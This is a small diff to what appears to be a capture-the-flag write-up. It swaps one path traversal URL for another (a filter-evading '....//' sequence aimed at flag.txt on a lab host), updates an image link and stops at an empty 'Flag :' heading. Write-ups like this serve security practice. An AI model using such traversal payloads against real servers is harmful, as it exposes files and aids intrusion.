@@ -1,8 +1,8 @@
 ```
-http://165.232.88.151:3333/page?path=....//....//....//....//flag.txt
+http://159.65.198.12:3333/page?path=....//....//....//flag.txt
 ```
 
-[![image.png](https://i.postimg.cc/k5KtMF2Y/image.png)](https://postimg.cc/DWfzBGd1)
+[![image.png](https://i.postimg.cc/1R2PMxC6/image.png)](https://postimg.cc/V5q3LhcL)
 
 ## Flag : 
 
